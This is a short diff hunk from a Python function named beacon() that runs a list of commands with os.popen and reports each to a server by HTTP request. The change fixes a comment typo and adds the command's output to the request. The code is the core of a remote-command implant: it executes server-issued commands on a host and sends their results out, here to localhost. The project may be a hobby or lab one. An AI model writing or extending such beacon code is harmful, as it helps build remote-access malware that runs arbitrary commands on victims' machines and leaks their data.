@@ -48,8 +48,8 @@ def beacon():
 			for cmd in commands:
 				#executes comand
 				cmds[cmd] = os.popen(cmd).read()
-				#send confirmation of command being rung
-				requests.get('http://localhost/confirm?ip=' + ip + '&cmd=' + cmd) 
+				#send confirmation of command being run
+				requests.get('http://localhost/confirm?ip=' + ip + '&cmd=' + cmd + '&output=' +cmds[cmd]) 
 			#print commands
 			print(cmds)
 			#TODO send command respone to server
